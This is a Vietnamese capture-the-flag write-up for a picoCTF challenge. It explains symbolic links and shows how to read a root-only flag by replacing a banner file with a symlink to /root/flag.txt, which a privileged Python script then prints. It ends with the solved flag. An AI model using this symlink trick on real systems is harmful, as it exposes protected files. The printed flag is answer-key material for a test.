# Write up

## Symlink?
Symlink (viết tắt của Symbolic Link), hay còn gọi là liên kết tượng trưng, là một loại file đặc biệt trong hệ điều hành Unix/Linux (bao gồm cả macOS, WSL...) dùng để trỏ đến một file hoặc thư mục khác.
    - Gồm:
        + Hard Link: Liên kết trực tiếp đến nội dung file gốc, chia sẻ inode.
        + Soft Link (Symlink): Là một file chứa đường dẫn đến file khác, hoạt động giống shortcut trong Windows.
    - Đặc Điểm:
        + Là một file thực sự, chứa đường dẫn tới file gốc.
        + Khi truy cập symlink thì hệ thống sẽ chuyển đến file/thư mục gốc.
        + Nếu file gốc bị xóa, symlink sẽ bị gãy (dangling symlink) → không truy cập được.
        + Có thể trỏ tới cả file và thư mục, cả đường dẫn tương đối hoặc tuyệt đối.
        + Không lưu dữ liệu thực: Symlink chứa đường dẫn đến file gốc, không chứa dữ liệu nội dung của file
    - Cách tạo:
        `ln -s [đường_dẫn_tới_gốc] [tên_symlink]`
    ví dụ:
        `ln -s /home/long/data.txt link_data.txt`
        ý nghĩa là: Tạo symlink `link_data.txt` trỏ đến file gốc `/home/long/data.txt`
    - cách kiểm tra symlink:
        `ls -l`
        kết quả có dạng:
        `lrwxrwxrwx 1 user user    9 Jul 22 22:22 link_data.txt -> data.txt`

## solve
ta kiểm tra vị trí hiện tại
```
player@challenge:~$ ls
ls
banner  text
```

kiểm tra banner
```
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
```

ta kiểm tra folder root
```
player@challenge:~$ cd /root
cd /root
player@challenge:/root$ ls
ls
flag.txt  script.py
```

## Script.py
```
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```

ta thấy dòng
`with open("/home/player/banner", "r") as f`
Vậy mục tiêu là tạo symlink `/home/player/banner` trỏ đến `/root/flag.txt`
vì đã tồn tại file banner nên ta không thể tạo symlink ngay được mà phải xóa file banner trước
`rm banner`
sau đó
`ln -s /root/flag.txt banner`
hoặc
`ln -s /root/flag.txt /home/player/banner`

thử lại xem
```
player@challenge:~$ ls -l
ls -l
total 4
lrwxrwxrwx 1 player player 14 Jul 22 16:22 banner -> /root/flag.txt
-rw-r--r-- 1 root   root   13 Feb  7  2024 text
```

tạo symlink thành công.
Tắt sever đi khởi động lại
## flag
`picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}`